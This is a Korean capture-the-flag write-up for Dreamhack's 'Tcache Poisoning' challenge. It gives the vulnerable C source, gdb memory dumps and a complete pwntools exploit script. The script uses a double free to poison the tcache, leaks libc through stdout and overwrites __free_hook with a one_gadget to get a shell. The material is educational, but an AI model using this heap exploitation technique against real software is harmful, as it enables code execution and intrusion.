[🚀 **DH - Tcache Poisoning**](https://dreamhack.io/wargame/challenges/358)

---

```c
// Name: tcache_poison.c
// Compile: gcc -o tcache_poison tcache_poison.c -no-pie -Wl,-z,relro,-z,now

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  void *chunk = NULL;
  unsigned int size;
  int idx;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    printf("1. Allocate\n");
    printf("2. Free\n");
    printf("3. Print\n");
    printf("4. Edit\n");
    scanf("%d", &idx);

    switch (idx) {
      case 1:
        printf("Size: ");
        scanf("%d", &size);
        chunk = malloc(size);
        printf("Content: ");
        read(0, chunk, size - 1);
        break;
      case 2:
        free(chunk);
        break;
      case 3:
        printf("Content: %s", chunk);
        break;
      case 4:
        printf("Edit chunk: ");
        read(0, chunk, size - 1);
        break;
      default:
        break;
    }
  }

  return 0;
}
```
---
1을 누르면 malloc  
2를 누르면 free  
3을 누르면 printf  
4를 누르면 수정이가능한 c 코드이다

---


```gdb
pwndbg> p &stdout
$1 = (FILE **) 0x601010 <stdout@@GLIBC_2.2.5>
pwndbg> x/gx 0x601010
0x601010 <stdout@@GLIBC_2.2.5>:	0x00007ffff7fab6a0
pwndbg> p _IO_2_1_stdout_
$2 = {
  file = {
    _flags = -72540025,
    _IO_read_ptr = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
    _IO_read_end = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
    _IO_read_base = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
    _IO_write_base = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
    _IO_write_ptr = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
    _IO_write_end = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
    _IO_buf_base = 0x7ffff7fab723 <_IO_2_1_stdout_+131> "",
    _IO_buf_end = 0x7ffff7fab724 <_IO_2_1_stdout_+132> "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7faa980 <_IO_2_1_stdin_>,
    _fileno = 1,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7ffff7fac7e0 <_IO_stdfile_1_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7faa880 <_IO_wide_data_1>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7fa74a0 <_IO_file_jumps>
}
```
---
stdout에 대해 먼저 알아볼 필요가있는데
libc에 있는 stdout은 이렇게 생겼고

---

```gdb
pwndbg> x/100gx 0x00007ffff7fab6a0 - 0x40
0x7ffff7fab660 <_IO_2_1_stderr_+160>:	0x00007ffff7faa780	0x0000000000000000
0x7ffff7fab670 <_IO_2_1_stderr_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7fab680 <_IO_2_1_stderr_+192>:	0x0000000000000000	0x0000000000000000
0x7ffff7fab690 <_IO_2_1_stderr_+208>:	0x0000000000000000	0x00007ffff7fa74a0
0x7ffff7fab6a0 <_IO_2_1_stdout_>:	0x00000000fbad2087	0x00007ffff7fab723
0x7ffff7fab6b0 <_IO_2_1_stdout_+16>:	0x00007ffff7fab723	0x00007ffff7fab723
0x7ffff7fab6c0 <_IO_2_1_stdout_+32>:	0x00007ffff7fab723	0x00007ffff7fab723
0x7ffff7fab6d0 <_IO_2_1_stdout_+48>:	0x00007ffff7fab723	0x00007ffff7fab723
0x7ffff7fab6e0 <_IO_2_1_stdout_+64>:	0x00007ffff7fab724	0x0000000000000000
0x7ffff7fab6f0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7fab700 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007ffff7faa980
0x7ffff7fab710 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7ffff7fab720 <_IO_2_1_stdout_+128>:	0x0000000000000000	0x00007ffff7fac7e0
0x7ffff7fab730 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7fab740 <_IO_2_1_stdout_+160>:	0x00007ffff7faa880	0x0000000000000000
0x7ffff7fab750 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7fab760 <_IO_2_1_stdout_+192>:	0x0000000000000000	0x0000000000000000
0x7ffff7fab770 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x00007ffff7fa74a0
```
---
우린 여기서 stdout libc주소를 우지하기위해 하위 1바이트를 0x60으로 덮을거다 익스할떄
지금은 문제 libc 버전이랑 다른걸 예시로 보여줬지만 내가 푸는 libc버전에서는 
stdout 은 0x60이 마지막 1바이트이다 그리고 하위 12bit 3byte 정도는 일치한다 glibc에서 

---

<span style="color: #00FF00; font-weight: bold;">Payload</span>

---
```Python
from pwn import *

p = remote("host8.dreamhack.games",19676)
e = ELF("./tcache_poison")
libc = ELF("./libc-2.27.so")
one_gadget = 0x4f432

def Allocate(size,data):
    p.sendlineafter(b"4. Edit\n",b"1")
    p.sendlineafter(b"Size: ",size)
    p.sendafter(b"Content: ",data)

Allocate(b"30",b"aaaa")

#free
p.sendlineafter(b"4. Edit\n",b"2")

#edit
p.sendlineafter(b"4. Edit\n",b"4")
p.sendafter(b"Edit chunk: ",b"a"*8 + b"\x00")

#double free
p.sendlineafter(b"4. Edit\n",b"2")

#exploit
Allocate(b"30",p64(e.symbols["stdout"]))
Allocate(b"30",b"aaaa")
Allocate(b"30",b"\x60")

#leack
p.sendlineafter(b"4. Edit\n",b"3")
p.recvuntil(b"Content: ")
stdout_st = u64(p.recv(6) + b"\x00"*2)

print(hex(stdout_st))

#libc_base calc
libc_base = stdout_st - libc.symbols["_IO_2_1_stdout_"]
one_gadget += libc_base

free_hook = libc_base + libc.symbols["__free_hook"]




#free hook over write
Allocate(b"50",b"aaaa")

#free
p.sendlineafter(b"4. Edit\n",b"2")

#edit
p.sendlineafter(b"4. Edit\n",b"4")
p.sendafter(b"Edit chunk: ",b"a"*8 + b"\x00")

#double free
p.sendlineafter(b"4. Edit\n",b"2")

#go payload
Allocate(b"50",p64(free_hook))
Allocate(b"50",b"aaaa")
Allocate(b"50",p64(one_gadget))

p.sendlineafter(b"4. Edit\n",b"2")

p.interactive()
```
